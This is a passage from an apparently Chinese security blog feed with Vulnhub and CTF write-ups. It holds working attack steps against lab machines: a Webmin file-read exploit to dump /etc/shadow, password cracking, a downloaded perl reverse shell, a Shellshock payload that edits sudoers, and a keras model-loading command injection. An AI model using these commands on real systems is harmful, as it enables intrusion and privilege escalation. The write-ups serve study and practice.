class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p>好像没什么信息了</p><h2 id="web渗透-9"><a class="markdownIt-Anchor" href="#web渗透-9"></a> web渗透</h2><p>对参数进行修改，触发报错<br /><code>http://192.168.32.128/index1.php?help=true&amp;connect=</code>，<code>Warning: include()</code>可知此处可以进行文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash</span><br><span class="line">obama:x:1001:1001::/home/obama:/bin/bash</span><br><span class="line">osama:x:1002:1002::/home/osama:/bin/bash</span><br><span class="line">yomama:x:1003:1003::/home/yomama:/bin/bash</span><br></pre></td></tr></table></figure><p>访问扫描的目录，<code>http://192.168.32.128/php/phpMyAdmin/</code><br />发现<code>phpMyAdmin 2.6.3-pl1</code>，没密码，先放一边</p><p>那就只有<strong>10000端口</strong>可以访问了，是<code>webmin</code>的登陆界面，找默认账密，登不上去</p><p><code>searchsploit webmin</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl</span><br></pre></td></tr></table></figure><p>有<strong>任意文件读取</strong>漏洞，正好我们读不到<code>shadow</code>文件，我们可以试试看<br /><code>searchsploit webmin -m 2017.pl</code><br /><code>perl 2017.pl -h</code><br /><code>perl 2017.pl 192.168.32.128 10000 /etc/shadow 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::</span><br><span class="line">obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::</span><br><span class="line">osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::</span><br><span class="line">yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span><br></pre></td></tr></table></figure><p>上面内容保存为<code>hash</code>文件<br /><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>得到<code>vmware/h4ckm3</code></p><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><h2 id="提权-4"><a class="markdownIt-Anchor" href="#提权-4"></a> 提权</h2><p>这台机子跑不了<code>sudo</code>，看了下定时任务，貌似没思路</p><p>然后，前面读取的<code>shadow</code>文件，肯定是以<strong>root</strong>的权限读取的，那么我们通过靶机执行我们的<code>反弹shell</code>脚本就可以<strong>root</strong>了</p><p><code>cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</code>并且<code>vim</code>修改<code>ip</code>和端口</p><p><code>kali</code>开启<code>web</code>服务<code>php -S 0:80</code><br />靶机下载<code>wget http://192.168.32.129/shell.cgi</code>，并添加<strong>执行权限</strong>，<code>chmod +x shell.cgi</code></p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/shell.cgi 0</code><br /><code>kali</code>开启监听</p><p>这里必须使用<code>cgi</code>后缀的原因貌似是，靶机的作者对<code>apache</code>中间件做了<strong>解析后缀</strong>的限制，但是没有限制<code>cgi</code>文件，其他的<code>php</code>、<code>pl</code>文件都无法执行</p><h2 id="思路二"><a class="markdownIt-Anchor" href="#思路二"></a> 思路二</h2><p>还是根据上面的<strong>任意文件读取</strong>漏洞来的，因为我们可能未必能读到<code>shadow</code>文件，<strong>权限不够</strong></p><h3 id="ssh敏感文件authorized_keys获取"><a class="markdownIt-Anchor" href="#ssh敏感文件authorized_keys获取"></a> ssh敏感文件Authorized_keys获取</h3><p>根据参考文章：<code>OpenSSL 0.9.8e</code>这个版本的<code>OpenSSL</code>可以<strong>根据公钥找到私钥</strong>，实现<strong>免密登陆</strong>（可是你没登陆靶机怎么知道哪个版本呢？）</p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/.ssh/authorized_keys 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm</span><br></pre></td></tr></table></figure><p>这个版本的<code>OpenSSH</code>用了伪随机数获取密钥，我们可以用伪随机数生成器<code>PRG</code>(pseudo random number generator)进行私钥的破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit prng </span><br><span class="line">searchsploit prng -m 5622.txt</span><br><span class="line">cat 5622.txt</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2</span><br><span class="line">tar -jxvf 5622.tar.bz2</span><br><span class="line">grep -lr &#x27;AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQ&#x27;</span><br><span class="line">cp rsa/2048/d8629ce6dc8f2492e1454c13f46adb26-4566 private_key</span><br></pre></td></tr></table></figure><p><code>ssh -i private_key -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><p>难绷，<code>windows</code>这边也登不上去了，还是需要密码，<code>kali</code>直接<code>command-line line 0: Bad key types 'ssh-rsa,ssh-dss'.</code>，不会整了，蒜鸟蒜鸟</p><p>所以，这一步正常的话是可以通过私钥文件，免密登陆的</p><h3 id="shellshock漏洞提权"><a class="markdownIt-Anchor" href="#shellshock漏洞提权"></a> shellshock漏洞提权</h3><p><code>bash --version</code>，<code>GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)</code>，远低于4.3版本，我们可以用<strong>shellshock漏洞</strong>提权</p><p><code>vim shellshockexp.cgi</code>，写入<code>#!/bin/bash</code></p><p><code>curl 'http://192.168.32.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/shellshockexp.cgi' -A '() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers'</code></p><p>好吧，这一步也不行，成功的情况只返回一行？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Error - Missing Content-Type Header&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;Failed to exec /usr/local/webmin/mscstyle3/unauthenticated/../../../../../../../../../../../../../../home/vmware/shellshockexp.cgi : Permission denied</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>正常来说，<code>sudo /bin/bash</code>即可提权成功了</p><p>同样的，<strong>Linux内核版本</strong>也较低，可以尝试<strong>内核提权</strong>，找好<code>exp</code>即可<br /><code>Linux ubuntuvm 2.6.22-14-server</code></p><h2 id="总结-9"><a class="markdownIt-Anchor" href="#总结-9"></a> 总结</h2><p>需要关注一些特殊文件的读取权限，看看能否成为突破口；还有就是关注低版本服务的漏洞</p><h1 id="holynix未完成"><a class="markdownIt-Anchor" href="#holynix未完成"></a> holynix(未完成)</h1><h2 id="主机发现与端口扫描-8"><a class="markdownIt-Anchor" href="#主机发现与端口扫描-8"></a> 主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br /><code>192.168.32.130</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br />只扫出了80端口<br />扫描脚本也没什么东西，SQL注入这些</p><h2 id="web渗透-10"><a class="markdownIt-Anchor" href="#web渗透-10"></a> web渗透</h2><p>一进去是个登陆界面，不是市面上的cms<br />一开始在用户名处试万能密码，没反应，那就看看报错位置，账密都输入单引号，然后报错了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br><span class="line">SQL Statement:SELECT * FROM accounts WHERE username=&#x27;\&#x27;&#x27; AND password=&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>原来用户名这里被转义了</p><p><code>xx/' or 1=1#</code></p><p>发现上传，但没权限<code>Home directory uploading disabled for user alamo</code><br /><code>Security</code>这里可以文件读取，但get看不见请求，尝试post<br /><code>http://192.168.32.130/index.php?page=ssp.php</code><br />请求体<code>B=Display+File&amp;text_file_name=ssp%2Femail.txt</code><br /><code>text_file_name</code>可以实现文件读取</p><p>(可能不更新了)……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;此文诞生于本人实习期间，属于是&lt;strong&gt;摸鱼成果&lt;/strong&gt;，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸&lt;/p&gt;
&lt;p&gt;只能说&lt;code&gt;vulnhub&lt;/code&gt;这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()&lt;/p&gt;
&lt;p&gt;在某次训</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>零散Web题记录</title>
    <link href="https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-05-31T18:44:13.000Z</published>
    <updated>2025-05-31T18:58:02.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="d3ctf2025-d3model"><a class="markdownIt-Anchor" href="#d3ctf2025-d3model"></a> D3CTF2025 - d3model</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这题很明显，唯一的漏洞利用点在<code>is_valid_model()</code>函数，搜索<code>keras.models.load_model()</code>漏洞，发现了最近的<code>CVE-2025-1550</code>，找到了<a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">攻击参考博客</a></p><p>然后比赛的时候没打出来。。。<br />赛后发现是，对<strong>python的subprocess模块</strong>了解还是不够深入（上次记录过一次，但还是忘了，emmm）</p><p>需要修改的地方为<code>&quot;inbound_nodes&quot;: [&#123;&quot;args&quot;: [[&quot;env &gt;&gt; index.html&quot;]], &quot;kwargs&quot;: &#123;&quot;bufsize&quot;: -1, &quot;shell&quot;: True&#125;&#125;]</code><br /><code>json文件</code>也相对应做修改，不然的话，命令无法<strong>通过shell执行</strong>。。。</p><blockquote><p>如果shell为True，那么指定的命令将通过shell执行。如果我们需要访问某些shell的特性，如管道、文件名通配符、环境变量扩展功能，这将是非常有用的。</p></blockquote><p>还有就是这题貌似是<strong>不出网</strong>的，但<code>docker</code>文件里面告诉了我们<code>flag</code>在<strong>环境变量</strong>中，并且只有<code>index.html</code>可写。。。</p><p>最简单的题没打出来……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;d3ctf2025-d3model&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#d3ctf2025-d3model&quot;&gt;&lt;/a&gt; D3CTF2025 - d3model&lt;/h1&gt;
&lt;figure class=&quot;highlight py&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ACTF2025</title>
    <link href="https://hvang10.github.io/2025/04/26/ACTF2025/"/>
    <id>https://hvang10.github.io/2025/04/26/ACTF2025/</id>
    <published>2025-04-26T09:21:20.000Z</published>
    <updated>2025-05-02T17:44:43.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> signin</h2><blockquote><p>签到：<a href="https://github.com/team-s2/ACTF-2025">https://github.com/team-s2/ACTF-2025</a></p></blockquote><p><img src="https://picx.zhimg.com/80/v2-be1c2454925cc232fe32bdc9dce6ec1a_1440w.png" alt="" /><br /><strong>ACTF{w3lc0ME2aCtf2O25h@veAn1ceDAY}</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="not-so-web-1"><a class="markdownIt-Anchor" href="#not-so-web-1"></a> not so web 1</h2><blockquote><p>Web不够，其他来凑</p></blockquote><p>这题也算是<code>web</code>吧，<strong>AES-CBC字节翻转攻击</strong></p><p>先随便注册个账号登进去，拿到<code>server code (encoded)</code>，解<code>base64</code>即可得到<strong>题目源码</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass(<span class="params">kw_only=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        cookie_json = cipher.decrypt(padded)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = cipher.decrypt(padded)</span><br><span class="line">        cookie_json_bytes = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">        cookie_json = cookie_json_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_dict = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, cookie_dict.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_dict = asdict(user)</span><br><span class="line">    cookie_json = json.dumps(cookie_dict)</span><br><span class="line">    cookie_json_bytes = cookie_json.encode()</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    padded = pad(cookie_json_bytes, <span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(</span><br><span class="line">                    time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span 